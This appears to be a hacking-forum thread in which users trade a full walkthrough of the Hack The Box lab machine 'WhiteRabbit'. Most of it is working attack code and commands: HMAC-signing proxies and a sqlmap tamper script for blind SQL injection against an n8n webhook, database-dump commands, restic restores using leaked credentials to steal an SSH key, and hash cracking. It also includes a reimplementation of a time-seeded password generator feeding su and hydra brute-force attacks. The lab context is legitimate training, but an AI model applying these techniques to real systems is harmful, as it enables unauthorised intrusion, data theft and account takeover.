@@ -1,0 +1,503 @@
+Linux Insane after a long time 
+
+Related Content 
+
+https://patchstack.com/database/wordpres...nerability
+
+https://wpscan.com/vulnerability/bede6fa...d5bc31c6f/
+
+
+https://wpscan.com/vulnerability/1de2f97...2a5e9a8ad/
+
+
+https://huggingface.co/WhiteRabbitNeo/Wh...Neo-13B-v1
+
+
+https://vulners.com/cvelist/CVELIST:CVE-2023-22581
+
+
+https://github.com/kh4sh3i/RabbitMQ-Pentesting
+
+430[{"ok":true,"msg":"Incorrect username or password."}]
+
+Login bypass:
+Change false -> true
+
+it will only shows GUI, so it's kinda limited and all actions must be authenticated 
+
+v3701 Wrote: 
+(04-05-2025, 07:49 PM)Crimsonday Wrote: 430[{"ok":true,"msg":"Incorrect username or password."}]
+
+Login bypass:
+Change false -> true
+
+it will only shows GUI, so it's kinda limited and all actions must be authenticated
+
+That's why I deleted it, we need subdomain to get a creds 
+
+v3701 Wrote: 
+(04-05-2025, 07:49 PM)Crimsonday Wrote: 430[{"ok":true,"msg":"Incorrect username or password."}]
+
+Login bypass:
+Change false -> true
+
+it will only shows GUI, so it's kinda limited and all actions must be authenticated
+
+its on status.whiterabbit.htb subdomain 
+
+enumerate the /status/ directory on status.whiterabbit.htb 
+sql injection in n8n endpoint. 
+
+samuelballsiu1 Wrote: 
+(04-06-2025, 06:02 AM)unrecognized Wrote: sql injection in n8n endpoint.
+
+I can't find the n8n endpoint, which you mentioned. Can you please be more clear?
+http://a668910b5514e.whiterabbit.htb/en/...h_webhooks
+
+POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
+Host: 28efa8f7df.whiterabbit.htb -- this is n8n
+x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 81
+
+{
+  "campaign_id": 1,
+  "email": "test@ex.com",
+  "message": "Clicked Link"
+}
+
+i think in this POST is sqli but can't get it work - maybe somebody explain how to do it 
+
+The email field is injectable, I was able to drop a table, just not able to get output. You need to set the gophish signature with the secret in the json. Anyone have a known valid email for the box? 
+I knew about signature, what is your payload to drop table? 
+
+With SQLi you can extract juicy data. The signature can be calculated using sqlmap and the eval param 
+before performing the sql you always have to generate the hmac signature. I generated a proxy script using deepseek which intercepts the request than calculates the hmac and sends it to the server. it took some while because it's blind sqli. I think you can also do this by just using sqlmap with eval
+i'm trying something like that:
+sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
+--data='{"campaign_id":1,"email":"test@ex.com","message":"Clicked Link"}' \
+--eval="import hmac, hashlib, json; _locals['auxHeaders']['x-gophish-signature'] = 'sha256=' + hmac.new('3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'.encode(),json.dumps({'campaign_id':1,'email':_locals['payload'],'message':'Clicked Link'},separators=(',', ':')).encode(), hashlib.sha256).hexdigest()" \
+--risk=3 --level=5 --dbms=mysql --batch --proxy='http://127.0.0.1:8080' -p email
+it gives valid signature but can't find sqli 
+import ctypes
+import sys
+
+# Load the appropriate C library depending on the platform.
+if sys.platform.startswith('linux'):
+libc = ctypes.CDLL("libc.so.6")
+elif sys.platform == "darwin":
+libc = ctypes.CDLL("libc.dylib")
+elif sys.platform.startswith('win'):
+libc = ctypes.CDLL("msvcrt.dll")
+else:
+raise Exception("Unsupported platform")
+
+def generate_password(seed):
+charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+# Set the seed using the C library's srand()
+libc.srand(seed)
+password = []
+for _ in range(20):
+# Call the C library's rand()
+r = libc.rand()
+index = r % 62 # There are 62 characters in the charset.
+password.append(charset[index])
+print("".join(password))
+
+def main():
+# Unix timestamp for 2024-08-30 14:40:42 UTC.
+base_time_sec = 1725028842
+# Loop through all 1000 milliseconds in that second.
+for ms in range(1000):
+seed = base_time_sec * 1000 + ms
+generate_password(seed)
+
+if __name__ == '__main__':
+main()
+
+help me later rep if you want 
+High level path, various details have already been explained very nicely here:
+
+- find vhost: status.whiterabbit.htb
+- find url: status.whiterabbit.htb/status/temp
+- on this page we find subdomain a668910b5514e, which is wikijs
+- wikijs details a gophish webhook site on 28efa8f7df.whiterabbit.htb
+- wikijs also contains the json definition for the workflow, which reveals a sql injection in the node "Get current phishing score"
+- exploit the sql inject to find the database temp with table command_log
+- we find two important commands here, a restic subdomain 75951e6ff with password, and a hint for a password generator
+- install restic restore the repo from the command log to find a (crackable) password protected 7z with bob's sshkey
+- ssh as bob into a container, on port 2222
+- bob can sudo restic, use this to read /root (see gtfobins) to find morpheus sshkey (port 22)
+- analyze /opt/neo-password-generator/neo-password-generator; it has a very basic password generator (watch of for time zone issues, make some test runs!)
+- we will end up with 1000 possible passwords for neo, use sucrack to find out which
+- neo can sudo anything 
+So no one pays 8 credits for nothing
+
+use this python script and run it 
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import requests
+import hashlib
+import hmac
+import json
+
+HMAC_KEY = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
+TARGET_URL = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
+
+class HMACProxyHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        body = self.rfile.read(content_length).decode()
+
+        signature = hmac.new(HMAC_KEY.encode(), body.encode(), hashlib.sha256).hexdigest()
+
+        headers = {
+            "Host": "28efa8f7df.whiterabbit.htb",
+            "x-gophish-signature": f"sha256={signature}",
+            "Content-Type": "application/json"
+        }
+
+        response = requests.post(
+            TARGET_URL,
+            headers=headers,
+            data=body,
+            verify=False
+        )
+
+        self.send_response(response.status_code)
+        self.end_headers()
+        self.wfile.write(response.content)
+
+if __name__ == "__main__":
+    server = HTTPServer(('localhost', 8081), HMACProxyHandler)
+    server.serve_forever()
+Then run this sqlmap 
+sqlmap -u http://localhost:8081 --data '{"campaign_id":1,"email":"*","message":"Clicked Link"}' --headers "Content-Type: application/json" --risk 3 --level 5 --proxy=http://localhost:8081 --dump-all -D temp --batch --threads=5 –time-sec=3
+
+You'll get the table dump which contains a new endpoint and what you need to know how to proceed further 
+Oh no that was unintentional I thought that was just a spoiler tag! i am going to remove that. I did not want to charge 8 credits that rediculous!
+
+
+I couldnt edit the original post, my apologies,  so I deleted it. I thought the hidden tag was like spoiler tag. I didn't know it was going to charge 8 credits to unlock it! 
+
+Anyway here is the script:
+
+Run it with go
+
+package main
+
+import (
+    "bytes"
+    "crypto/hmac"
+    "crypto/sha256"
+    "encoding/hex"
+    "encoding/json"
+    "fmt"
+    "io"
+    "log"
+    "net/http"
+)
+
+const (
+    secret    = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
+    webhookURL = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
+)
+
+type Payload struct {
+    CampaignID int    `json:"campaign_id"`
+    Email      string `json:"email"`
+    Message    string `json:"message"`
+}
+
+func calculateHMAC(payload Payload) string {
+    jsonBytes, _ := json.Marshal(payload)
+    h := hmac.New(sha256.New, []byte(secret))
+    h.Write(jsonBytes)
+    return hex.EncodeToString(h.Sum(nil))
+}
+
+func logRequest(r *http.Request) {
+    clientIP := r.RemoteAddr
+    method := r.Method
+    uri := r.URL.RequestURI()
+    protocol := r.Proto
+    log.Printf("%s - - \"%s %s %s\" 200 -", clientIP, method, uri, protocol)
+}
+
+func handler(w http.ResponseWriter, r *http.Request) {
+    logRequest(r)
+
+    email := r.URL.Query().Get("q")
+    if email == "" {
+        http.Error(w, `{"error": "Missing 'q' query parameter for email"}`, http.StatusBadRequest)
+        return
+    }
+
+    payload := Payload{
+        CampaignID: 1,
+        Email:      email,
+        Message:    "Clicked Link",
+    }
+
+    signature := calculateHMAC(payload)
+
+    jsonBytes, err := json.Marshal(payload)
+    if err != nil {
+        http.Error(w, `{"error": "Failed to encode payload"}`, http.StatusInternalServerError)
+        return
+    }
+
+    req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonBytes))
+    if err != nil {
+        http.Error(w, `{"error": "Failed to create request"}`, http.StatusInternalServerError)
+        return
+    }
+
+    req.Header.Set("Content-Type", "application/json")
+    req.Header.Set("x-gophish-signature", "hmac="+signature)
+
+    client := &http.Client{}
+    resp, err := client.Do(req)
+    if err != nil {
+        http.Error(w, fmt.Sprintf(`{"error": "%s"}`, err.Error()), http.StatusInternalServerError)
+        return
+    }
+    defer resp.Body.Close()
+
+    io.Copy(w, resp.Body)
+}
+
+func main() {
+    http.HandleFunc("/", handler)
+    fmt.Println("Listening on http://localhost:12345")
+    log.Fatal(http.ListenAndServe(":12345", nil))
+}
+
+and then run SQLMap against it:
+sqlmap -u 'http://127.0.0.1:12345/?q=neo' -p q --level 5 --risk 3 --batch --dbs -D temp --dump
+
+ 
+
+
+What is this write-up? The logo and box names seems to fit but the content ist complete garbage.
+
+(04-06-2025, 12:40 PM)cybercornelius Wrote: High level path, various details have already been explained very nicely here:
+
+- find vhost: status.whiterabbit.htb
+- find url: status.whiterabbit.htb/status/temp
+- on this page we find subdomain a668910b5514e, which is wikijs
+- wikijs details a gophish webhook site on 28efa8f7df.whiterabbit.htb
+- wikijs also contains the json definition for the workflow, which reveals a sql injection in the node "Get current phishing score"
+- exploit the sql inject to find the database temp with table command_log
+- we find two important commands here, a restic subdomain 75951e6ff with password, and a hint for a password generator
+- install restic restore the repo from the command log to find a (crackable) password protected 7z with bob's sshkey
+- ssh as bob into a container, on port 2222
+- bob can sudo restic, use this to read /root (see gtfobins) to find morpheus sshkey (port 22)
+- analyze /opt/neo-password-generator/neo-password-generator; it has a very basic password generator (watch of for time zone issues, make some test runs!)
+- we will end up with 1000 possible passwords for neo, use sucrack to find out which
+- neo can sudo anything
+
+Awesome. Perfectly explained 
+using this you can achieve root with ```sudo su``` after you log into ssh 
+Usar GPU (--format=7z-opencl) acelera el proceso (requiere John con soporte OpenCL). 
+Once you dump the correct database, you'll be able to see some restic credentials, what you can do is to restore the data in order to exfiltrate bob's ssh private key:
+❯ echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
+
+❯ chmod 600 .restic_passwd
+
+❯ export RESTIC_REPOSITORY="rest:http://75951e6ff.whiterabbit.htb"
+
+❯ export RESTIC_PASSWORD_FILE=".restic_passwd"
+
+❯ restic snapshots
+repository 5b26a938 opened (version 2, compression level auto)
+created new cache in /home/redacted/.cache/restic
+ID        Time                Host        Tags        Paths
+------------------------------------------------------------------------
+272cacd5  2025-03-06 19:18:40  whiterabbit            [color=#4cea5e]/dev/shm/bob/ssh[/color]
+------------------------------------------------------------------------
+1 snapshots
+
+❯ restic restore latest --target ./restored_data
+For the SQL Injection:
+Every time you wanna send a request to the webhook, you'll need first to calculate the signature header, otherwise, the request wil be invalid.
+I've created a python proxy to send all sqlmap tool requests through this proxy, so the proxy will calculate the payload's signature and them forward the request to the webhook:
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse
+import requests
+import hmac
+import hashlib
+# Configuration
+TARGET_HOST = "28efa8f7df.whiterabbit.htb"
+TARGET_URL = f"http://{TARGET_HOST}"
+HMAC_KEY = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
+class GoPhishProxy(BaseHTTPRequestHandler):
+    def do_POST(self):
+        # Read the request body
+        content_len = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(content_len)
+        # Clean the path from possible full URLs or malformed inputs
+        clean_path = urlparse(self.path).path
+        full_url = f"{TARGET_URL}{clean_path}"
+        # Calculate HMAC-SHA256 signature
+        signature = hmac.new(HMAC_KEY, body, hashlib.sha256).hexdigest()
+        # Prepare headers for forwarding
+        forward_headers = {key: self.headers[key] for key in self.headers if key.lower() != 'host'}
+        forward_headers['Host'] = TARGET_HOST
+        forward_headers['x-gophish-signature'] = f"sha256={signature}"
+        # Forward the request to the actual server
+        try:
+            response = requests.post(
+                full_url,
+                headers=forward_headers,
+                data=body,
+                allow_redirects=False,
+                verify=False
+            )
+        except Exception as e:
+            self.send_error(502, f"Proxy forwarding failed: {str(e)}")
+            return
+        # Respond back to sqlmap
+        self.send_response(response.status_code)
+        for k, v in response.headers.items():
+            if k.lower() != 'content-encoding':
+                self.send_header(k, v)
+        self.end_headers()
+        self.wfile.write(response.content)
+        # Debug log
+        print(f"[+] Forwarded to: {full_url}")
+        print(f"    Signature: sha256={signature}")
+        print(f"    Payload: {body.decode(errors='ignore')[:200]}")
+if __name__ == "__main__":
+    print("
+GoPhish SQLmap Proxy running on http://127.0.0.1:8000")
+    server = HTTPServer(('0.0.0.0', 8000), GoPhishProxy)
+    server.serve_forever()
+
+While the proxy is up and running, on another terminal, you can run SQLmap:
+sqlmap -r sqlmap.req --proxy=http://127.0.0.1:8000 --batch --level=5 --risk=3 --threads=5
+The sqlmap.req file content I used was:
+POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
+Host: 28efa8f7df.whiterabbit.htb
+Content-Type: application/json
+User-Agent: sqlmap
+Accept: */*
+{"campaign_id":1,"email":"*","message":"Clicked Link"}
+Is important to leave the request file without the x-gophish-signature header because the proxy will be adding that automatically 
+I have the neo pub.key but I can't find the password generator. Where to find it? 
+You can find it on /opt bro 
+@ssh bob no /opt dir. restic download to loacal machine no /opt dir on the system... please explain exactly where I can find it. just for sanity. :-)
+
+I am working on the sucrack part with my passwd file hoping to get the priv esc to work. still don't know where you guys found the passgen binary...
+
+I a did not mean neo but morpheus ssh and pub key. I only have bob@ssh @ port 2222 as access.
+
+Never mind the box is unstable, now I can log in with the id_rsa to morpheus@whiterabbit... pff sometimes. but got user. 
+7z File Password
+If you're still having problems with the 7z file, it is possible to use https://github.com/philsmd/7z2hashcat to retrieve the hash of the password and then use hashcat to crack it. 
+Make sure to format it correctly with (user:hash) and run it with 
+hashcat -m 11600 hash.txt -w [wordlist here] --user
+. 
+
+From here, the path to ssh is quite clear for user bob. Make sure to use the correct port.
+
+neo-password-generator
+Here is where I am currently stuck.
+
+Analyzing the binary gave me two attack vectors; either calling the binary with the correct timestamp or replicating the code and messing around with it manually. 
+I have tried both approaches without luck.
+
+Currently chugging through a wordlist containing 1000+ permutations of passwords for the target user (neo). However, either the machine is unstable or my compiled binary of sucrack is unstable - either way it sometimes just halts processing. Thankful for any and all tips. 
+calling the binary will not work because you can not manipulate the time using milliseconds (which is needed). you have to reverse the algorythm and write your own generator that produces 1000 entries. then bruteforce ssh. 
+
+Very nice. But how to get the value of HMAC_KEY? Can anyone give me some hints?
+Note: I found it in JSON file. Thanks for providing the script. 
+Kelesha007 Wrote: Okay so I got the file bob.7z. But I am failing retrieving the password for it. Made a pass generator once got a "successful" password that gave an error wrong password. Can someone help with that?
+
+you got to generate a hash from bob.7z and then use john to crack the hash 
+Another way to exploit the SQLi
+
+sqlmap tamper:
+import hmac
+import hashlib
+
+secret_key = b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'
+
+def tamper(payload, **kwargs):
+    escaped_payload = payload.replace('"', '\\"')
+    message = f'{{"campaign_id":1,"email":"{escaped_payload}","message":"Clicked Link"}}'.encode('utf-8')
+
+    hmac_object = hmac.new(secret_key, message, hashlib.sha256)
+    hmac_result = hmac_object.hexdigest()
+    hmac_payload = "sha256="+hmac_result
+
+    headers = kwargs.get("headers", {})
+    headers["x-gophish-signature"] = hmac_payload
+
+    return payload
+
+sqlmap command:
+sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d --data '{"campaign_id":1,"email":"*","message":"Clicked Link"}' -H "Content-Type: application/json" --risk 3 --level 5 --tamper=hmac_tamper.py --dump-all -D temp --batch --threads=5 --time-sec=3 --no-escape
+Thanks for the help guys. I actually managed to get root yesterday shortly after my message, so I thought I'd share (on a fairly high level) how I did it. 
+
+Root flag
+
+The following assumes you have figured out how to get access to via user morpheus.
+    1. Locate the binary.
+    2. Analyze it (for example with Ghidra) and fully understand how it works.
+    3. Create your own implementation of it, using an appropriate timestamp as the seed. Make sure your implementation increments the timestamp with millisecond precision. Generate a password for each round of increments. (Hint: there's 1000 milliseconds in 1 second.)
+    4. Save the generated passwords as a custom wordlist.
+    5. Use the custom wordlist to bruteforce the target user. There are multiple ways of doing this, for example via su as another user or via ssh.
+
+Hope this is helpful. 
+
+
+The secret's in the wiki 
+Analyze the Password Generator:
+
+You will see what is used to generate password.
+
+You need to recreate a generator to create you set of passwords.
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+int main() {
+    char cs[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    char pwd[21];
+    struct tm tm = {
+        .tm_year = 2024-1900,
+        .tm_mon = 8-1,
+        .tm_mday = 30,
+        .tm_hour = 14,
+        .tm_min = 40,
+        .tm_sec = 42
+    };
+    time_t t = timegm(&tm);
+    for (int ms = 0; ms < 1000; ms++) {
+        srand(t * 1000 + ms);
+        for (int i = 0; i < 20; i++) pwd[i] = cs[rand() % 62];
+        pwd[20] = '\0';
+        printf("%s\n", pwd);
+    }
+    return 0;
+}
+
+Build and runL gcc -o gen neo_gen.c
+./gen > pass.txt
+
+from this point you can decide how would you try to figure out what is the right password.
+
+You can copy over the pass.txt  and:
+#!/bin/bash
+while read pass; do
+  echo "$pass" | su neo -c 'whoami' 2>/dev/null | grep neo && echo "[+] Password: $pass" && break
+done < /tmp/pass.txt
+
+Or  hydra -l neo -P pass.txt -Vv -t 12 10.10.11.63 ssh 
+
+It's on the wiki http://a668910b5514e.whiterabbit.htb/gophish/, there is a file called gophish_to_phishing_score_database.json
+http://a668910b5514e.whiterabbit.htb/gop...abase.json
+Inside you can find the hmac secret 
